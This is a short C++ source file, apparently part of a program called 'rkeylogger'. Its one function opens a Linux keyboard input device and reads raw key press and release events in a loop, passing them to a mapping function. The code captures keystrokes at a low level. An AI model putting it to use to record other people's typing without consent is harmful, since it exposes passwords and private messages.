#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <iostream>
#include <vector>

#include "rkeylogger.h"

void read_devnode(const char *devnode) {
    int fd = open(devnode, O_RDONLY);
    if (fd == -1) {
        std::cerr << "[ ERROR ]: Cannot open the keyboard.\n" << std::endl;
        return;
    }
    
    struct input_event ev;
    
    while (true) {
        ssize_t bytesRead = read(fd, &ev, sizeof(struct input_event));
        if (
            bytesRead == sizeof(struct input_event) && 
            ev.type == EV_KEY &&
            (ev.value == 0 || ev.value == 1)
        ) {
            if(map_code(ev.code, ev.value)){
                break;
            }
        }
    }

    close(fd);
    std::cout << "[ LOG ]: Success" << std::endl;
}